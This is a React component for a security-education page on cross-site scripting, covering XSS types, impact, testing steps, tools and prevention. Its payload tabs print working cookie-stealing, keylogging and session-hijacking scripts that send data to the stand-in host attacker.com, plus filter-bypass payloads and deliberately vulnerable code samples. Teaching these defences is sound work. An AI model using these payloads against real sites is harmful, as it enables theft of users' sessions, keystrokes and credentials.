import React from 'react';
import { Code } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';
const XSS: React.FC = () => {
  return <section id="xss" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Cross-Site Scripting (XSS)</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            XSS attacks occur when an application includes untrusted data in a new web page without proper validation or escaping,
            allowing attackers to execute scripts in the victim's browser. This can lead to session hijacking, credential theft,
            malicious redirects, and website defacement. XSS is consistently ranked among the top web application vulnerabilities.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-cybr-muted">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Execute arbitrary JavaScript in victims' browsers to steal cookies/session tokens, 
              redirect to phishing sites, modify page content, or perform actions impersonating the user.
            </AlertDescription>
          </Alert>
        </div>
        
        {/* Types of XSS */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of XSS Attacks</h4>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
            <SecurityCard title="Reflected XSS" description="Non-persistent attack where malicious script is reflected off a web server, typically through URLs, search results, or error messages. The attacker tricks victims into clicking malicious links." severity="medium" />
            <SecurityCard title="Stored XSS" description="Malicious script is permanently stored on the target server (e.g., in a database, comment field, forum post) and later retrieved by victims during normal browsing. Most dangerous form of XSS." severity="high" />
            <SecurityCard title="DOM-based XSS" description="Vulnerability exists in client-side code rather than server-side code. JavaScript modifies the DOM in an unsafe way based on attacker-controllable data sources like URL fragments or localStorage." severity="medium" />
          </div>
        </div>
        
        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <ul className="list-disc pl-6 space-y-2 mb-4">
            <li><strong>User Input Fields:</strong> Comment sections, search boxes, contact forms, user profiles</li>
            <li><strong>URL Parameters:</strong> Query strings, fragment identifiers</li>
            <li><strong>HTTP Headers:</strong> Referer, User-Agent (when reflected in pages)</li>
            <li><strong>File Upload Features:</strong> Especially those allowing HTML or SVG uploads</li>
            <li><strong>Data Import Functions:</strong> CSV imports with HTML/JavaScript injection</li>
            <li><strong>Third-Party Widgets:</strong> External content that may not follow the same security practices</li>
          </ul>
        </div>
        
        {/* Impact of XSS */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Impact of XSS Attacks</h4>
          <ul className="list-disc pl-6 space-y-2 mb-4">
            <li><strong>Session Hijacking:</strong> Stealing session cookies to impersonate users</li>
            <li><strong>Credential Harvesting:</strong> Creating fake login forms to steal passwords</li>
            <li><strong>Keylogging:</strong> Recording user keypresses to capture sensitive information</li>
            <li><strong>Phishing:</strong> Injecting convincing phishing content into trusted sites</li>
            <li><strong>Web Application Defacement:</strong> Modifying the appearance of websites</li>
            <li><strong>Malware Distribution:</strong> Redirecting users to malware downloads</li>
            <li><strong>Cross-Site Request Forgery (CSRF):</strong> Forcing the user's browser to perform unwanted actions</li>
            <li><strong>Browser Exploitation:</strong> Leveraging browser vulnerabilities to install malware</li>
          </ul>
        </div>
        
        {/* How XSS Works */}
        <div>
          <h4 className="text-xl font-semibold mb-4">How XSS Vulnerabilities Work</h4>
          <ol className="list-decimal pl-6 space-y-2 mb-4">
            <li><strong>Entry Point Identification:</strong> Attacker identifies where user input is accepted (forms, URLs, etc.)</li>
            <li><strong>Input Reflection/Storage:</strong> The application includes this input in HTML responses either immediately (reflected) or after storage (stored)</li>
            <li><strong>Escaping Bypass:</strong> The attacker crafts input that bypasses any existing validation or sanitization</li>
            <li><strong>Payload Execution:</strong> When the victim loads the affected page, the injected script executes in their browser</li>
            <li><strong>Data Exfiltration/Manipulation:</strong> The script accesses sensitive data or performs actions on behalf of the victim</li>
          </ol>
        </div>
        
        {/* Sample Payloads */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Sample XSS Payloads</h4>
          <Tabs defaultValue="basic">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="basic">Basic Payloads</TabsTrigger>
              <TabsTrigger value="advanced">Advanced Payloads</TabsTrigger>
              <TabsTrigger value="bypass">Filter Bypasses</TabsTrigger>
            </TabsList>
            <TabsContent value="basic" className="mt-4">
              <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-2 text-green-400"># Basic alert payload:</p>
                <p className="mb-3">&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># Event handler based:</p>
                <p className="mb-3">&lt;img src="x" onerror="alert('XSS')"&gt;</p>
                
                <p className="mb-2 text-green-400"># JavaScript URI:</p>
                <p className="mb-3">&lt;a href="javascript:alert('XSS')"&gt;Click Me&lt;/a&gt;</p>
                
                <p className="mb-2 text-green-400"># DOM event:</p>
                <p>&lt;body onload="alert('XSS')"&gt;</p>
              </div>
            </TabsContent>
            
            <TabsContent value="advanced" className="mt-4">
              <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-2 text-green-400"># Cookie stealing:</p>
                <p className="mb-3">&lt;script&gt;
                  {`
                  // Using a hypothetical malicious script
                  var stolenCookie = document.cookie;
                  // Send to attacker's server
                  new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(stolenCookie);
                  `}
                  &lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># Keylogger:</p>
                <p className="mb-3">&lt;script&gt;
                  {`
                  // Hypothetical malicious keylogger
                  document.addEventListener('keypress', function(evt) {
                    var key = evt.key;
                    // Send to attacker's server
                    navigator.sendBeacon('https://attacker.com/log', key);
                  });
                  `}
                  &lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># Session hijacking with XHR:</p>
                <p>&lt;script&gt;
                  {`
                  // Hypothetical session hijacking script
                  var xhr = new XMLHttpRequest();
                  xhr.open('GET', 'https://vulnerable-site.com/account', true);
                  xhr.onload = function() {
                    var data = btoa(this.responseText);
                    // Send to attacker's server
                    navigator.sendBeacon('https://attacker.com/steal', data);
                  };
                  xhr.send();
                  `}
                  &lt;/script&gt;</p>
              </div>
            </TabsContent>
            
            <TabsContent value="bypass" className="mt-4">
              <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-2 text-green-400"># Case manipulation bypass:</p>
                <p className="mb-3">&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</p>
                
                <p className="mb-2 text-green-400"># Encoded characters bypass:</p>
                <p className="mb-3">&lt;img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"&gt;</p>
                
                <p className="mb-2 text-green-400"># No quotes required:</p>
                <p className="mb-3">&lt;script&gt;alert`XSS`&lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># Exotic contexts:</p>
                <p>&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/svg&gt;</p>
              </div>
            </TabsContent>
          </Tabs>
        </div>
        
        {/* Examples of Vulnerable Code */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Example Vulnerable Code</h4>
          <CodeExample language="javascript" isVulnerable={true} title="Vulnerable Code" code={`// Directly inserting user input into HTML
document.getElementById("output").innerHTML = 
  "Search results for: " + userInput;

// Attacker input: <script>sendCookiesToAttacker(document.cookie)</script>
// This executes the script in the victim's browser

// Server-side example (PHP)
<?php
echo '<div>Welcome, ' . $_GET['name'] . '!</div>';
?>
// Attacker request: /page.php?name=<script>alert(document.cookie)</script>

// React example with dangerouslySetInnerHTML
function Comment({ userComment }) {
  return <div dangerouslySetInnerHTML={{ __html: userComment }} />;
}
// This renders userComment as HTML without sanitization`} />
          
          <CodeExample language="javascript" isVulnerable={false} title="Secure Implementation" code={`// Using safe methods to add text content
document.getElementById("output").textContent = 
  "Search results for: " + userInput;

// Or properly escaping HTML on the server side
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

// Safe server-side rendering (PHP)
<?php
echo '<div>Welcome, ' . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . '!</div>';
?>

// Safe React component using proper encoding
function Comment({ userComment }) {
  // userComment is automatically encoded when used as text content
  return <div>{userComment}</div>;
}

// Additional protections:
// 1. Implement Content-Security-Policy headers
// 2. Use frameworks that escape output by default (React, Vue, Angular)
// 3. Apply input validation with allowlists
// 4. Use HttpOnly cookies to prevent JavaScript access to sensitive cookies
// 5. Use X-XSS-Protection header for older browsers`} />
        </div>
        
        {/* Step-by-Step Detection */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step XSS Testing Methodology</h4>
          <ol className="list-decimal pl-6 space-y-2 mb-4">
            <li><strong>Identify Entry Points:</strong> Map all user input points (parameters, headers, form fields)</li>
            <li><strong>Test Simple Payloads:</strong> Try basic payloads like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
            <li><strong>Analyze Responses:</strong> Check if input is reflected and how it's encoded/filtered</li>
            <li><strong>Test Context-Specific Payloads:</strong> Craft payloads based on where input is inserted (HTML, JavaScript, attribute)</li>
            <li><strong>Try Filter Bypasses:</strong> If filters are detected, try various evasion techniques</li>
            <li><strong>Test for DOM-based XSS:</strong> Check client-side JavaScript that manipulates DOM with user input</li>
            <li><strong>Test for Stored XSS:</strong> Insert payloads in stored content and verify if it executes when accessed later</li>
            <li><strong>Verify Impact:</strong> Demonstrate the real-world impact (cookie theft, etc.) with non-destructive proof-of-concept</li>
          </ol>
        </div>
        
        {/* Helpful Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">XSS Testing Tools</h4>
          <ul className="list-disc pl-6 space-y-2 mb-4">
            <li><strong>Burp Suite:</strong> Proxy tool with built-in XSS scanner and manual testing capabilities</li>
            <li><strong>OWASP ZAP:</strong> Free alternative to Burp with active and passive XSS scanning</li>
            <li><strong>XSS Hunter:</strong> Specialized platform for identifying blind XSS vulnerabilities</li>
            <li><strong>BeEF (Browser Exploitation Framework):</strong> Advanced tool for demonstrating XSS impact</li>
            <li><strong>DOMPurify:</strong> Client-side sanitization library to test if your protection is adequate</li>
            <li><strong>XSSer:</strong> Command-line tool for detecting and exploiting XSS vulnerabilities</li>
            <li><strong>Browser Developer Tools:</strong> For analyzing DOM changes and JavaScript execution</li>
          </ul>
        </div>
        
        {/* Prevention Techniques */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive Prevention Techniques</h4>
          <Tabs defaultValue="input">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="input">Input Handling</TabsTrigger>
              <TabsTrigger value="output">Output Encoding</TabsTrigger>
              <TabsTrigger value="headers">Security Headers</TabsTrigger>
            </TabsList>
            <TabsContent value="input" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>Input Validation:</strong> Validate input against strict schemas (whitelisting)</li>
                <li><strong>Content-Type Validation:</strong> Ensure input meets expected format (numbers, dates, etc.)</li>
                <li><strong>Reject Known Bad Input:</strong> Block input containing JavaScript or HTML tags when not needed</li>
                <li><strong>Sanitization:</strong> Use libraries like DOMPurify to clean HTML when rich content is required</li>
                <li><strong>Maximum Length Enforcement:</strong> Limit input length to reduce attack surface</li>
              </ul>
            </TabsContent>
            
            <TabsContent value="output" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>Context-Specific Encoding:</strong> Use the right encoding for where data is being used (HTML, JS, URLs, CSS)</li>
                <li><strong>HTML Escaping:</strong> Convert &lt;, &gt;, &quot;, &#x27;, and &amp; to their HTML entity equivalents</li>
                <li><strong>JavaScript Escaping:</strong> Use proper encoding for data used in JavaScript contexts</li>
                <li><strong>Use Safe APIs:</strong> Prefer methods like <code>textContent</code> over <code>innerHTML</code></li>
                <li><strong>Template Systems:</strong> Use auto-escaping template engines (React, Vue, Angular, EJS, etc.)</li>
              </ul>
            </TabsContent>
            
            <TabsContent value="headers" className="mt-4">
              <ul className="list-disc pl-6 space-y-2">
                <li><strong>Content-Security-Policy (CSP):</strong> Restrict sources of executable scripts and other resources</li>
                <li><strong>X-XSS-Protection:</strong> Enable browser's built-in XSS filters (legacy browsers)</li>
                <li><strong>X-Content-Type-Options:</strong> Prevent MIME-sniffing attacks with <code>nosniff</code></li>
                <li><strong>HttpOnly Cookies:</strong> Prevent JavaScript from accessing cookies</li>
                <li><strong>SameSite Cookies:</strong> Restrict cookie transmission to same-site requests</li>
              </ul>
            </TabsContent>
          </Tabs>
        </div>
        
        {/* Development Environment Considerations */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Development Environment Considerations</h4>
          <div className="space-y-3">
            <div className="p-4 border border-gray-200 dark:border-gray-700 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Frontend Frameworks</h5>
              <p className="text-sm">Modern frameworks like React, Vue, and Angular provide built-in XSS protection by automatically escaping content, but can be bypassed when using unsafe methods like <code>dangerouslySetInnerHTML</code> (React), <code>v-html</code> (Vue), or <code>bypassSecurityTrustHtml</code> (Angular). Always avoid these methods unless absolutely necessary and sanitize input first.</p>
            </div>
            
            <div className="p-4 border border-gray-200 dark:border-gray-700 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Template Engines</h5>
              <p className="text-sm">Server-side template engines like EJS, Handlebars, or Jinja2 may have different default behaviors for escaping. Some automatically escape output while others require explicit escaping. Always verify the security features of your template engine and test thoroughly.</p>
            </div>
            
            <div className="p-4 border border-gray-200 dark:border-gray-700 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">AJAX and API Endpoints</h5>
              <p className="text-sm">JSON APIs can be vulnerable to XSS if responses containing untrusted data are parsed and inserted into the DOM. Set proper <code>Content-Type</code> headers (application/json) and validate input server-side regardless of client-side validation.</p>
            </div>
            
            <div className="p-4 border border-gray-200 dark:border-gray-700 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">User-Generated Content</h5>
              <p className="text-sm">When allowing rich HTML content (blogs, forums), use libraries like DOMPurify to sanitize HTML, restrict allowed tags and attributes to a safe subset, and consider using markdown instead of raw HTML.</p>
            </div>
          </div>
        </div>
        
        {/* Special Cases */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Special XSS Cases and Edge Scenarios</h4>
          <div className="space-y-3">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Blind XSS</h5>
              <p className="text-sm">Vulnerabilities that only trigger in specific contexts not immediately visible to the attacker, such as admin panels, logs, or support tickets. Use tools like XSS Hunter to detect these by including callbacks in payloads.</p>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Self-XSS</h5>
              <p className="text-sm">Requires the victim to paste malicious code into their browser. While not directly exploitable by attackers, it can be combined with social engineering to trick users into executing malicious code against themselves.</p>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">mXSS (Mutation-based XSS)</h5>
              <p className="text-sm">Occurs when seemingly safe HTML is transformed into a malicious form by the browser's parser or DOM manipulation. Often bypasses sanitizers that don't account for browser parsing quirks.</p>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">CSP Bypass Techniques</h5>
              <p className="text-sm">Advanced attacks that circumvent Content-Security-Policy protections through policy misconfigurations, JSONP endpoints, or unsafe-eval usage. Always test CSP configurations thoroughly.</p>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">XSS in Unusual Contexts</h5>
              <p className="text-sm">SVG images, CSS contexts, PDF generation, and other non-traditional HTML contexts can harbor XSS vulnerabilities that require specialized testing and mitigation approaches.</p>
            </div>
          </div>
        </div>
      </div>
    </section>;
};
export default XSS;